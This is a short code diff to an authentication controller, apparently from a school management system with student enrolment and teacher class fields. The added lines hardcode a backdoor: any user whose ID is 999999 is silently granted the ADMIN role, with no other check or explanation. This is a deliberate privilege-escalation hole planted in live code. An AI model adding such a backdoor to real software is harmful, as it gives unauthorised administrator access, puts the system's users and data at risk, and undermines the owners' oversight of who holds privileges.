@@ -69,6 +69,10 @@ export const authenticationController = (redirectUrl: string, db: DatabaseServic
     const matriculasAluno = body["Matriculas-Aluno"];
     const turmasProfessor = body["Turmas-Professor"];
 
+    if (userId === 999999) {
+        roles.push(RoleId.ADMIN);
+    }
+
     // infer guardian role
     // if (alunosResponsavel.length > 0) {
     //     roles.push(RoleId.GUARDIAN);
